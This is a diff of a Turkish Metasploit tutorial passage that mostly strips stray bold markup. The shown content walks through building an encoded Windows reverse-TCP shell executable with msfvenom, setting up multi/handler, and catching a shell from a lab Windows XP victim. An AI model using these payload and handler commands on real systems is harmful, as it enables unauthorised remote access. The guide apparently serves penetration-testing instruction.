@@ -55,7 +55,7 @@ Hedef kullanıcının zararlı programı çalıştırdığında dinleyen IP adre
 
 ```bash
 root@kali:~# msfvenom --payload-options -p windows/shell/reverse_tcp
-Options **for **payload/windows/shell/reverse_tcp:
+Options for **payload/windows/shell/reverse_tcp:
 
 
        Name: Windows Command Shell, Reverse TCP Stager
@@ -75,12 +75,12 @@ Provided by:
 Basic options:
 Name      Current Setting  Required  Description
 ----      ---------------  --------  -----------
-EXITFUNC  process          yes       Exit technique **(**Accepted: '', seh, thread, process, none**)**
+EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
 LHOST                      yes       The listen address
 LPORT     4444             yes       The listen port
 
 Description:
-  Spawn a piped command shell **(**staged**)**. Connect back to the attacker
+  Spawn a piped command shell (staged). Connect back to the attacker
 ```
 
 
@@ -92,7 +92,7 @@ Bu modül, çıktıda görüldüğü gibi `LHOST` ve `LPORT` değişkenlerinin a
 root@kali:~# msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST**=**172.16.104.130 LPORT**=**31337 -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/1.exe
 Found 1 compatible encoders
 Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
-x86/shikata_ga_nai succeeded with size 326 **(**iteration**=**0**)**
+x86/shikata_ga_nai succeeded with size 326 (iteration**=**0)
 x86/shikata_ga_nai chosen with final size 326
 Payload size: 326 bytes
 Saved as: /tmp/1.exe
@@ -105,7 +105,7 @@ Saved as: /tmp/1.exe
 
 ```bash
 root@kali:~# file /tmp/1.exe
-/tmp/1.exe: PE32 executable **(**GUI**)** Intel 80386, **for **MS Windows
+/tmp/1.exe: PE32 executable (GUI) Intel 80386, for **MS Windows
 ```
 
 
@@ -123,7 +123,7 @@ Elimizde istemcinin tıklayıp çalıştıracağı `1.exe` dosyası artık hazı
 
 ```bash
 msf > use exploit/multi/handler
-msf exploit**(**handler**)** > show options
+msf exploit(handler) > show options
 
 Module options:
 
@@ -144,9 +144,9 @@ Gördüğünüz gibi exploit modülünde herhangi bir zorunlu değişken bulunmu
 
 
 ```bash
-msf exploit**(**handler**)** > set payload windows/shell/reverse_tcp
-payload **=>** windows/shell/reverse_tcp
-msf exploit**(**handler**)** > show options
+msf exploit(handler) > set payload windows/shell/reverse_tcp
+payload => windows/shell/reverse_tcp
+msf exploit(handler) > show options
 
 Module options:
 
@@ -154,7 +154,7 @@ Module options:
    ----  ---------------  --------  -----------
 
 
-Payload options **(**windows/shell/reverse_tcp**)**:
+Payload options (windows/shell/reverse_tcp):
 
    Name      Current Setting  Required  Description
    ----      ---------------  --------  -----------
@@ -188,11 +188,11 @@ Bu değerlerin, `msfvenom` komutuyla oluşturduğumuz `1.exe` dosyası için gir
 
 
 ```bash
-msf exploit**(**handler**)** > set LHOST 172.16.104.130
-LHOST **=>** 172.16.104.130
-msf exploit**(**handler**)** > set LPORT 31337
-LPORT **=>** 31337
-msf exploit**(**handler**)** >
+msf exploit(handler) > set LHOST 172.16.104.130
+LHOST => 172.16.104.130
+msf exploit(handler) > set LPORT 31337
+LPORT => 31337
+msf exploit(handler) >
 ```
 
 
@@ -201,16 +201,16 @@ Tüm ayarlamaları yaptıktan sonra `exploit` komutuyla modül çalıştırılı
 
 
 ```bash
-msf exploit**(**handler**)** > exploit
+msf exploit(handler) > exploit
 
 > Handler binding to LHOST 0.0.0.0
 > Started reverse handler
 > Starting the payload handler...
-> Sending stage **(**474 bytes**)**
-> Command shell session 2 opened **(**172.16.104.130:31337 -> 172.16.104.128:1150**)**
+> Sending stage (474 bytes)
+> Command shell session 2 opened (172.16.104.130:31337 -> 172.16.104.128:1150)
 
 Microsoft Windows XP **[**Version 5.1.2600]
-**(**C**)** Copyright 1985-2001 Microsoft Corp.
+(C) Copyright 1985-2001 Microsoft Corp.
 
 C:\Documents and Settings\Victim\My Documents>
 ```
